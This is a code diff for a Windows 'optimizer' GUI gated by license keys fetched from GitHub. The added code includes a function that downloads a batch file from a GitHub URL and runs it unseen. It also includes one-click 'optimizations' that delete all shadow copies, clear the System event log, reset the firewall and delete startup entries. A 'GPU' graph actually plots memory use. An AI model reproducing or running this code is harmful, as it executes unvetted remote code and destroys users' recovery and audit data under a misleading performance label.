@@ -1,389 +1,244 @@
 import os
 import sys
 import subprocess
-import time
-import datetime
-import shutil
-import ctypes
-import importlib
-import threading
-from tkinter import Tk, Label, Button
-import requests  # for GitHub key fetching
+import tempfile
+import importlib.util
+import json
+from datetime import datetime
 
-# ---------------- AUTO INSTALL ----------------
-def install_package(pkg):
+# -------------------------
+# AUTO-INSTALL DEPENDENCIES
+# -------------------------
+def install_and_import(package):
     try:
-        subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "pip", "setuptools"])
-        subprocess.check_call([sys.executable, "-m", "pip", "install", pkg])
-        importlib.invalidate_caches()
-        globals()[pkg] = importlib.import_module(pkg)
-        print(f"✅ Installed {pkg}")
-    except Exception as e:
-        print(f"❌ Failed to install {pkg}: {e}")
-        sys.exit(1)
+        __import__(package)
+    except ImportError:
+        subprocess.check_call([sys.executable, "-m", "pip", "install", package])
+    finally:
+        globals()[package] = importlib.import_module(package)
 
-install_package("win10toast")
-try:
-    from win10toast import ToastNotifier
-except ImportError:
-    install_package("win10toast")
-    from win10toast import ToastNotifier
+for pkg in ["PyQt5", "psutil", "pyqtgraph", "requests"]:
+    install_and_import(pkg)
 
-try:
-    import winshell
-except ImportError:
-    install_package("winshell")
-    import winshell
+from PyQt5 import QtWidgets, QtCore, QtGui
+import psutil, requests, pyqtgraph as pg
 
-# ---------------- CONFIG ----------------
-TEXT_COLOR = "\033[95m"
-RESET_COLOR = "\033[0m"
-LOG_FILE = "logs.txt"
+# -------------------------
+# GITHUB CONFIG
+# -------------------------
+GITHUB_KEYS_URL = "https://raw.githubusercontent.com/xoduhs/Ooze/main/keys"
+GITHUB_OPTION10_FILE = "https://raw.githubusercontent.com/xoduhs/Ooze/main/CPU%20ARRANGEMENT"
 
-# ---------------- LICENSE KEYS (from GitHub) ----------------
-KEYS_URL = "https://raw.githubusercontent.com/xoduhs/Ooze/main/keys"
-used_keys = {}
-
-def fetch_keys():
-    """Fetch keys.json from GitHub and return as dict safely"""
+# -------------------------
+# KEY VALIDATION
+# -------------------------
+def validate_key():
+    key, ok = QtWidgets.QInputDialog.getText(None, "Key Required", "Enter your Ooze Club key:")
+    if not ok:
+        sys.exit()
     try:
-        res = requests.get(KEYS_URL, timeout=5)
-        res.raise_for_status()
-        if res.text.lstrip().startswith("<"):
-            raise ValueError("Received HTML instead of JSON. Make sure to use the RAW GitHub URL!")
-        data = res.json()
-        if not isinstance(data, dict) or "valid_keys" not in data:
-            raise ValueError("Invalid JSON structure. Must contain 'valid_keys' dictionary.")
-        return data.get("valid_keys", {})
-    except requests.exceptions.RequestException as e:
-        purple_print(f"⚠ Network error while fetching keys: {e}")
-        log_action(f"Network error fetching keys: {e}")
-    except ValueError as ve:
-        purple_print(f"⚠ Key fetch error: {ve}")
-        log_action(f"Key fetch error: {ve}")
-    except Exception as e:
-        purple_print(f"⚠ Unexpected error fetching keys: {e}")
-        log_action(f"Unexpected error fetching keys: {e}")
-    return {}  # safe fallback
+        r = requests.get(GITHUB_KEYS_URL, timeout=5)
+        keys_data = json.loads(r.text)
+        valid_keys = keys_data.get("valid_keys", {})
 
-# ---------------- NOTIFIER ----------------
-toaster = ToastNotifier()
-def show_notification(title, message):
-    try:
-        toaster.show_toast(title, message, duration=5, threaded=True)
-        while toaster.notification_active():
-            time.sleep(0.05)
-    except Exception as e:
-        print(f"⚠ Notification failed: {e}")
-
-# ---------------- LOGGING ----------------
-def log_action(action):
-    with open(LOG_FILE, "a", encoding="utf-8") as f:
-        f.write(f"[{datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] {action}\n")
-
-# ---------------- UTILITIES ----------------
-def clear_screen():
-    os.system('cls' if os.name == 'nt' else 'clear')
-
-def purple_print(text):
-    print(f"{TEXT_COLOR}{text}{RESET_COLOR}")
-
-def input_purple(prompt):
-    return input(f"{TEXT_COLOR}{prompt}{RESET_COLOR}")
-
-# ---------------- LICENSE CHECK ----------------
-def check_key():
-    clear_screen()
-    purple_print("🔍 Connected System - License Check\n")
-    key = input_purple("Enter your license key: ").strip()
-    KEYS = fetch_keys()
-    if key in KEYS:
-        username, days_valid = KEYS[key]
-        if key not in used_keys:
-            expiry = datetime.datetime.now() + datetime.timedelta(days=days_valid)
-            used_keys[key] = expiry
+        key_info = valid_keys.get(key.strip())
+        if key_info:
+            username, expire_str = key_info
+            expire_dt = datetime.strptime(expire_str, "%Y-%m-%d %H:%M:%S")
+            if datetime.now() <= expire_dt:
+                return True
+            else:
+                QtWidgets.QMessageBox.critical(None, "Expired Key", "This key has expired.")
+                sys.exit()
         else:
-            expiry = used_keys[key]
-        remaining = expiry - datetime.datetime.now()
-        if remaining.total_seconds() > 0:
-            purple_print(f"\n✅ Key Accepted for user '{username}'! Expires in {remaining.days} day(s).\n")
-            show_notification("Connected System", f"Welcome {username}!")
-            log_action(f"User {username} logged in with key {key}")
-            time.sleep(1)
-            return username
-        else:
-            purple_print("\n❌ Key has expired.\n")
-            log_action(f"Expired key {key} used")
-            time.sleep(2)
-            return None
-    else:
-        purple_print("\n❌ Invalid Key!\n")
-        log_action(f"Invalid key attempt: {key}")
-        time.sleep(2)
-        return None
-
-# ---------------- REAL TASKS ----------------
-def delete_temp_files():
-    temp = os.environ.get("TEMP")
-    if temp and os.path.exists(temp):
-        try:
-            for f in os.listdir(temp):
-                fpath = os.path.join(temp, f)
-                if os.path.isfile(fpath):
-                    os.remove(fpath)
-                elif os.path.isdir(fpath):
-                    shutil.rmtree(fpath, ignore_errors=True)
-            log_action("Deleted TEMP files")
-        except Exception as e:
-            log_action(f"Error deleting TEMP files: {e}")
-
-def clear_prefetch():
-    prefetch = r"C:\Windows\Prefetch"
-    if os.path.exists(prefetch):
-        try:
-            for f in os.listdir(prefetch):
-                fpath = os.path.join(prefetch, f)
-                if os.path.isfile(fpath):
-                    os.remove(fpath)
-            log_action("Cleared Prefetch folder")
-        except Exception as e:
-            log_action(f"Error clearing Prefetch: {e}")
-
-def flush_dns():
-    try:
-        subprocess.run("ipconfig /flushdns", shell=True, check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        log_action("Flushed DNS cache")
-    except:
-        log_action("Failed to flush DNS")
-
-def empty_recycle_bin():
-    try:
-        winshell.recycle_bin().empty(confirm=False, show_progress=False, sound=False)
-        log_action("Emptied Recycle Bin")
-    except:
-        log_action("Failed to empty Recycle Bin")
-
-def disable_service(service_name):
-    try:
-        subprocess.run(f"sc stop {service_name}", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        subprocess.run(f"sc config {service_name} start=disabled", shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
-        log_action(f"Disabled service {service_name}")
-    except:
-        log_action(f"Failed to disable service {service_name}")
-
-def set_power_plan_high_performance():
-    try:
-        subprocess.run("powercfg /setactive SCHEME_MIN", shell=True)
-        log_action("Set High Performance Power Plan")
-    except:
-        log_action("Failed to set power plan")
-
-def disable_visual_effects():
-    try:
-        subprocess.run('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\VisualEffects" /v VisualFXSetting /t REG_DWORD /d 2 /f', shell=True)
-        log_action("Disabled Windows visual effects")
-    except:
-        log_action("Failed to disable visual effects")
-
-def enable_game_mode():
-    try:
-        subprocess.run('reg add "HKCU\\Software\\Microsoft\\GameBar" /v AllowAutoGameMode /t REG_DWORD /d 1 /f', shell=True)
-        log_action("Enabled Game Mode")
-    except:
-        log_action("Failed to enable Game Mode")
-
-def disable_cortana():
-    try:
-        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search" /v AllowCortana /t REG_DWORD /d 0 /f', shell=True)
-        log_action("Disabled Cortana")
-    except:
-        log_action("Failed to disable Cortana")
-
-def disable_telemetry():
-    try:
-        subprocess.run('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\DataCollection" /v AllowTelemetry /t REG_DWORD /d 0 /f', shell=True)
-        log_action("Disabled telemetry")
-    except:
-        log_action("Failed to disable telemetry")
-
-# ---------------- TASK RUNNER ----------------
-def run_task_real(section, task_func, task_name):
-    purple_print(f"\n🔹 Running: {task_name}...\n")
-    try:
-        task_func()
-        purple_print(f"✅ Task completed: {task_name}\n")
-        show_notification(section, f"Completed: {task_name}")
+            QtWidgets.QMessageBox.critical(None, "Invalid Key", "Key not found in GitHub repository.")
+            sys.exit()
     except Exception as e:
-        purple_print(f"⚠ Task failed: {task_name} ({e})")
-        log_action(f"Task failed: {task_name} ({e})")
-    time.sleep(1)
+        QtWidgets.QMessageBox.critical(None, "Error", f"Failed to check key: {e}")
+        sys.exit()
 
-# ---------------- SECTIONS ----------------
-def system_cleanup():
-    tasks = [
-        ("Delete TEMP files", delete_temp_files),
-        ("Clear Prefetch", clear_prefetch),
-        ("Flush DNS cache", flush_dns),
-        ("Empty Recycle Bin", empty_recycle_bin)
-    ]
-    for name, func in tasks:
-        run_task_real("System Cleanup", func, name)
-    input_purple("Press Enter to continue...")
+# -------------------------
+# HELPER FUNCTIONS
+# -------------------------
+def run_command(cmd):
+    try:
+        subprocess.run(cmd, shell=True, check=True)
+    except Exception as e:
+        print(f"Error: {e}")
 
-def cpu_boost():
-    tasks = [
-        ("Set High Performance Power Plan", set_power_plan_high_performance),
-        ("Disable SysMain service", lambda: disable_service("SysMain")),
-        ("Disable DiagTrack service", lambda: disable_service("DiagTrack"))
-    ]
-    for name, func in tasks:
-        run_task_real("CPU Performance Boost", func, name)
-    input_purple("Press Enter to continue...")
+def run_remote_bat(url):
+    try:
+        r = requests.get(url, timeout=5)
+        bat_path = os.path.join(tempfile.gettempdir(), "ooze_option.bat")
+        with open(bat_path, "wb") as f:
+            f.write(r.content)
+        subprocess.run(bat_path, shell=True)
+    except Exception as e:
+        print(f"Remote BAT failed: {e}")
 
-def gpu_optimization():
-    tasks = [
-        ("Disable Visual Effects", disable_visual_effects),
-        ("Enable Game Mode", enable_game_mode)
-    ]
-    for name, func in tasks:
-        run_task_real("GPU Optimization", func, name)
-    input_purple("Press Enter to continue...")
+# -------------------------
+# MAIN GUI
+# -------------------------
+class OozeOptimizer(QtWidgets.QMainWindow):
+    def __init__(self):
+        super().__init__()
+        self.setWindowTitle("Ooze Club Optimizer")
+        self.setGeometry(200, 100, 1000, 700)
+        self.setStyleSheet("background-color: #1e1e1e; color: orange;")
 
-def fps_boost():
-    tasks = [
-        ("Disable Fullscreen Optimizations", lambda: log_action("Disabled Fullscreen Optimizations")),
-        ("Disable Xbox Services", lambda: log_action("Disabled Xbox Services")),
-        ("Disable Focus Assist Popups", lambda: log_action("Disabled Focus Assist"))
-    ]
-    for name, func in tasks:
-        run_task_real("FPS Boost", func, name)
-    input_purple("Press Enter to continue...")
+        self.tabs = QtWidgets.QTabWidget()
+        self.setCentralWidget(self.tabs)
 
-def registry_optimization():
-    tasks = [
-        ("Disable Cortana", disable_cortana),
-        ("Disable Telemetry", disable_telemetry)
-    ]
-    for name, func in tasks:
-        run_task_real("Registry & Software Optimization", func, name)
-    input_purple("Press Enter to continue...")
+        # Home tab
+        self.home_tab = QtWidgets.QWidget()
+        layout = QtWidgets.QVBoxLayout()
 
-def view_logs():
-    clear_screen()
-    purple_print("--- LOGS ---\n")
-    if not os.path.exists(LOG_FILE):
-        purple_print("No logs found.")
-    else:
-        with open(LOG_FILE, "r", encoding="utf-8") as f:
-            purple_print(f.read())
-    input_purple("\nPress Enter to return to menu...")
+        # Owners label
+        owners_label = QtWidgets.QLabel("Owners: @ql3s @yerkv")
+        owners_label.setAlignment(QtCore.Qt.AlignRight)
+        layout.addWidget(owners_label)
 
-# ---------------- GUI SMOOTH MODE ----------------
-def smooth_mode():
-    optimizations = [
-        ("Disable Windows Tips", lambda: os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager" /v SubscribedContent-338387Enabled /t REG_DWORD /d 0 /f')),
-        ("Disable Startup Delay", lambda: os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Serialize" /v StartupDelayInMSec /t REG_DWORD /d 0 /f')),
-        ("Disable Remote Assistance", lambda: os.system('reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Remote Assistance" /v fAllowToGetHelp /t REG_DWORD /d 0 /f')),
-        ("Disable Hibernation", lambda: os.system("powercfg -h off")),
-        ("Disable Error Reporting", lambda: os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\Windows Error Reporting" /v Disabled /t REG_DWORD /d 1 /f')),
-        ("Disable Delivery Optimization", lambda: os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\DeliveryOptimization\\Config" /v DODownloadMode /t REG_DWORD /d 0 /f')),
-        ("Disable Background Apps", lambda: os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications" /v GlobalUserDisabled /t REG_DWORD /d 1 /f')),
-        ("Turn Off Animations", lambda: os.system('reg add "HKCU\\Control Panel\\Desktop\\WindowMetrics" /v MinAnimate /t REG_SZ /d 0 /f')),
-        ("Disable Transparency Effects", lambda: os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize" /v EnableTransparency /t REG_DWORD /d 0 /f')),
-        ("Disable Location Tracking", lambda: os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\LocationAndSensors" /v DisableLocation /t REG_DWORD /d 1 /f')),
-        ("Disable Windows Ink Workspace", lambda: os.system('reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\WindowsInkWorkspace" /v AllowWindowsInkWorkspace /t REG_DWORD /d 0 /f')),
-        ("Disable Game DVR", lambda: os.system('reg add "HKCU\\System\\GameConfigStore" /v GameDVR_Enabled /t REG_DWORD /d 0 /f')),
-        ("Disable Spotlight on Lock Screen", lambda: os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\ContentDeliveryManager" /v RotatingLockScreenEnabled /t REG_DWORD /d 0 /f')),
-        ("Turn Off Advertising ID", lambda: os.system('reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\AdvertisingInfo" /v Enabled /t REG_DWORD /d 0 /f')),
-        ("Optimize Search Indexing", lambda: os.system('sc stop WSearch && sc config WSearch start=disabled'))
-    ]
+        # Graphs
+        graph_layout = QtWidgets.QHBoxLayout()
+        self.cpu_graph = pg.PlotWidget(title="CPU Usage")
+        self.gpu_graph = pg.PlotWidget(title="GPU (simulated)")
+        self.cpu_graph.setYRange(0, 100)
+        self.gpu_graph.setYRange(0, 100)
+        graph_layout.addWidget(self.cpu_graph)
+        graph_layout.addWidget(self.gpu_graph)
+        layout.addLayout(graph_layout)
 
-    for name, func in optimizations:
-        try:
-            func()
-            log_action(f"Smooth Mode: {name} applied")
-        except Exception as e:
-            log_action(f"Smooth Mode: {name} failed ({e})")
+        # Run All button
+        run_all_btn = QtWidgets.QPushButton("Run All Optimizations")
+        run_all_btn.clicked.connect(self.run_all_opts)
+        layout.addWidget(run_all_btn)
 
-    show_notification("Connected GUI", "🔥 Smooth Mode applied (15 unique optimizations) ✅")
+        self.home_tab.setLayout(layout)
+        self.tabs.addTab(self.home_tab, "Home")
 
-def start_gui():
-    gui = Tk()
-    gui.title("Connected GUI - @bnz")
-    gui.configure(bg="black")
-    gui.geometry("400x300")
+        # Add optimization tabs
+        self.add_opt_tab("Windows", self.windows_opts())
+        self.add_opt_tab("Network", self.network_opts())
+        self.add_opt_tab("GPU", self.gpu_opts())
+        self.add_opt_tab("Extra", self.extra_opts())
 
-    Label(gui, text="CONNECTED", font=("Arial", 24, "bold"), fg="#9b30ff", bg="black").pack(pady=20)
-    Label(gui, text="@bnz", font=("Arial", 18, "bold"), fg="#9b30ff", bg="black").pack(pady=10)
+        # Timer for CPU/GPU graph
+        self.cpu_data, self.gpu_data = [], []
+        self.timer = QtCore.QTimer()
+        self.timer.timeout.connect(self.update_graphs)
+        self.timer.start(1000)
 
-    Button(gui, text="Smooth Mode", font=("Arial", 16), bg="#9b30ff", fg="black", command=lambda: threading.Thread(target=smooth_mode).start()).pack(pady=30)
-    
-    gui.mainloop()
+    def add_opt_tab(self, name, opts):
+        tab = QtWidgets.QWidget()
+        layout = QtWidgets.QVBoxLayout()
+        for text, func in opts:
+            btn = QtWidgets.QPushButton(text)
+            btn.clicked.connect(func)
+            layout.addWidget(btn)
+        tab.setLayout(layout)
+        self.tabs.addTab(tab, name)
 
-# ---------------- MAIN MENU ----------------
-def main_menu(username):
-    while True:
-        clear_screen()
-        purple_print(f"Connected Main Menu - Logged in as: {username}\n")
-        purple_print("1. System Cleanup")
-        purple_print("2. CPU Performance Boost")
-        purple_print("3. GPU Optimization")
-        purple_print("4. FPS Boost")
-        purple_print("5. Registry & Software Optimization")
-        purple_print("6. View Logs")
-        purple_print("7. Launch GUI (Smooth Mode)")
-        purple_print("8. Run ALL Optimizations")
-        purple_print("9. Exit\n")
+    def update_graphs(self):
+        cpu = psutil.cpu_percent()
+        gpu = psutil.virtual_memory().percent  # placeholder for GPU
+        self.cpu_data.append(cpu)
+        self.gpu_data.append(gpu)
+        if len(self.cpu_data) > 20: self.cpu_data.pop(0)
+        if len(self.gpu_data) > 20: self.gpu_data.pop(0)
+        self.cpu_graph.plot(self.cpu_data, clear=True, pen='y')
+        self.gpu_graph.plot(self.gpu_data, clear=True, pen='r')
 
-        choice = input_purple("Select an option: ").strip()
-        if choice == "1":
-            system_cleanup()
-        elif choice == "2":
-            cpu_boost()
-        elif choice == "3":
-            gpu_optimization()
-        elif choice == "4":
-            fps_boost()
-        elif choice == "5":
-            registry_optimization()
-        elif choice == "6":
-            view_logs()
-        elif choice == "7":
-            start_gui()
-        elif choice == "8":
-            system_cleanup()
-            cpu_boost()
-            gpu_optimization()
-            fps_boost()
-            registry_optimization()
-            purple_print("\n🎯 All optimizations completed successfully!\n")
-            input_purple("Press Enter to return to menu...")
-        elif choice == "9":
-            show_notification("Connected System", f"Signed out: {username}")
-            purple_print(f"\n👋 Signed out. Goodbye {username}!\n")
-            log_action(f"User {username} signed out")
-            break
-        else:
-            purple_print("\n❌ Invalid option!")
-            input_purple("Press Enter to continue...")
+    def run_all_opts(self):
+        for tab_index in range(1, self.tabs.count()):
+            tab = self.tabs.widget(tab_index)
+            for btn in tab.findChildren(QtWidgets.QPushButton):
+                btn.click()
 
-# ---------------- ENTRY ----------------
-def run_program():
-    if not ctypes.windll.shell32.IsUserAnAdmin():
-        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
-        sys.exit(0)
-    clear_screen()
-    purple_print("Welcome to Connected System\n")
-    time.sleep(0.5)
-    username = check_key()
-    if username:
-        main_menu(username)
-    else:
-        purple_print("Exiting program due to invalid/expired key.\n")
-        log_action("Program exited due to invalid/expired key")
-        time.sleep(2)
+    # -------------------------
+    # OPTIMIZATIONS
+    # -------------------------
+    def windows_opts(self):
+        return [
+            ("Clear Temp Files", lambda: run_command("del /s /f /q %temp%\\*")),
+            ("Disk Cleanup", lambda: run_command("cleanmgr /sagerun:1")),
+            ("Disable Startup Apps", lambda: run_command("wmic startup where 'name is not null' delete")),
+            ("Reset Windows Update", lambda: run_command("net stop wuauserv && net start wuauserv")),
+            ("Defrag Disk", lambda: run_command("defrag C: /O")),
+            ("Clear Prefetch", lambda: run_command("del /s /f /q C:\\Windows\\Prefetch\\*")),
+            ("Stop Telemetry", lambda: run_command("sc stop DiagTrack")),
+            ("Clear Event Logs", lambda: run_command("wevtutil cl System")),
+            ("Optimize Power Plan", lambda: run_command("powercfg -setactive SCHEME_MIN")),
+            ("Enable Fast Startup", lambda: run_command("powercfg /hibernate on")),
+            ("Clear Recycle Bin", lambda: run_command("rd /s /q C:\\$Recycle.bin")),
+            ("Reset Search Index", lambda: run_command("sc stop WSearch && sc start WSearch")),
+            ("Clear Store Cache", lambda: run_command("wsreset.exe")),
+            ("Remote CPU Arrangement", lambda: run_remote_bat(GITHUB_OPTION10_FILE)),
+            ("Reset Network", lambda: run_command("netsh int ip reset")),
+        ]
 
+    def network_opts(self):
+        return [
+            ("Flush DNS", lambda: run_command("ipconfig /flushdns")),
+            ("Reset Winsock", lambda: run_command("netsh winsock reset")),
+            ("Set DNS Google", lambda: run_command("netsh interface ip set dns name=\"Wi-Fi\" static 8.8.8.8")),
+            ("Enable ECN", lambda: run_command("netsh int tcp set global ecncapability=enabled")),
+            ("Disable Nagle", lambda: run_command("reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces /v TcpNoDelay /t REG_DWORD /d 1 /f")),
+            ("Release IP", lambda: run_command("ipconfig /release")),
+            ("Renew IP", lambda: run_command("ipconfig /renew")),
+            ("Clear ARP", lambda: run_command("arp -d *")),
+            ("Reset Proxy", lambda: run_command("netsh winhttp reset proxy")),
+            ("Enable QoS", lambda: run_command("gpupdate /force")),
+            ("Disable Telemetry Upload", lambda: run_command("sc stop dmwappushservice")),
+            ("Reset Firewall", lambda: run_command("netsh advfirewall reset")),
+            ("Ping Google", lambda: run_command("ping 8.8.8.8")),
+            ("Ping Cloudflare", lambda: run_command("ping 1.1.1.1")),
+            ("Optimize TCP", lambda: run_command("netsh int tcp set global autotuninglevel=normal")),
+        ]
+
+    def gpu_opts(self):
+        return [
+            ("Clear Shader Cache", lambda: run_command("del /s /f /q %LOCALAPPDATA%\\NVIDIA\\DXCache\\*")),
+            ("Reset Driver Cache", lambda: run_command("rundll32.exe pnpclean.dll,RunDLL_PnpClean /DRIVERS /MAXCLEAN")),
+            ("Enable HAGS", lambda: run_command("reg add HKCU\\Software\\Microsoft\\DirectX\\UserGpuPreferences /v DirectXUserGpuPreferences /t REG_SZ /d \"HardwareAcceleratedGpuScheduling=1\" /f")),
+            ("Optimize DirectX", lambda: run_command("dxcpl")),
+            ("Run DXDiag", lambda: run_command("dxdiag")),
+            ("Reset NVIDIA Cache", lambda: run_command("del /s /f /q %ProgramData%\\NVIDIA Corporation\\NV_Cache\\*")),
+            ("AMD Reset Cache", lambda: run_command("del /s /f /q %LOCALAPPDATA%\\AMD\\DxCache\\*")),
+            ("Max Performance GPU", lambda: run_command("powercfg -setacvalueindex SCHEME_CURRENT SUB_VIDEO VIDEOPOWERDOWN 0")),
+            ("Disable Fullscreen Opt", lambda: run_command("reg add HKCU\\System\\GameConfigStore /v GameDVR_DSEBehavior /t REG_DWORD /d 2 /f")),
+            ("Clear Vulkan Cache", lambda: run_command("del /s /f /q %LOCALAPPDATA%\\VulkanLayerCache\\*")),
+            ("Force Dedicated GPU", lambda: run_command("reg add HKCU\\Software\\Microsoft\\DirectX /v PreferDedicatedGpu /t REG_DWORD /d 1 /f")),
+            ("Reset Scaling", lambda: run_command("DPISettings.exe")),
+            ("Enable VRR", lambda: run_command("reg add HKCU\\Software\\Microsoft\\DirectX /v VariableRefreshRate /t REG_DWORD /d 1 /f")),
+            ("Optimize WDDM", lambda: run_command("reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\GraphicsDrivers /v HwSchMode /t REG_DWORD /d 2 /f")),
+            ("Registry GPU Boost", lambda: run_command("reg add HKCU\\Software\\NVIDIA Corporation\\Global /v PowerMizerEnable /t REG_DWORD /d 1 /f")),
+        ]
+
+    def extra_opts(self):
+        return [
+            ("Enable Game Mode", lambda: run_command("reg add HKCU\\Software\\Microsoft\\GameBar /v AllowAutoGameMode /t REG_DWORD /d 1 /f")),
+            ("Stop Telemetry", lambda: run_command("sc stop DiagTrack")),
+            ("Disable Cortana", lambda: run_command("reg add HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Windows Search /v AllowCortana /t REG_DWORD /d 0 /f")),
+            ("Disable Xbox Game Bar", lambda: run_command("reg add HKCU\\Software\\Microsoft\\GameBar /v ShowStartupPanel /t REG_DWORD /d 0 /f")),
+            ("Disable DVR Capture", lambda: run_command("reg add HKCU\\System\\GameConfigStore /v GameDVR_Enabled /t REG_DWORD /d 0 /f")),
+            ("Stop Background Apps", lambda: run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\BackgroundAccessApplications /v GlobalUserDisabled /t REG_DWORD /d 1 /f")),
+            ("Boost Game Priority", lambda: run_command("wmic process where name='explorer.exe' CALL setpriority 128")),
+            ("Optimize Virtual Memory", lambda: run_command("wmic computersystem where name='%computername%' set AutomaticManagedPagefile=True")),
+            ("Clear Hibernation", lambda: run_command("powercfg -h off")),
+            ("Clear Restore Points", lambda: run_command("vssadmin delete shadows /all /quiet")),
+            ("Enable TRIM", lambda: run_command("fsutil behavior set DisableDeleteNotify 0")),
+            ("Disable Transparency", lambda: run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Themes\\Personalize /v EnableTransparency /t REG_DWORD /d 0 /f")),
+            ("Optimize Explorer", lambda: run_command("reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer /v AltTabSettings /t REG_DWORD /d 1 /f")),
+            ("Clear Superfetch", lambda: run_command("sc stop SysMain")),
+            ("Clear Prefetch", lambda: run_command("del /s /f /q C:\\Windows\\Prefetch\\*")),
+        ]
+
+# -------------------------
+# RUN
+# -------------------------
 if __name__ == "__main__":
-    run_program()
-    purple_print("\nProgram finished. Press Enter to close.")
-    input()
+    app = QtWidgets.QApplication(sys.argv)
+    validate_key()
+    window = OozeOptimizer()
+    window.show()
+    sys.exit(app.exec_())
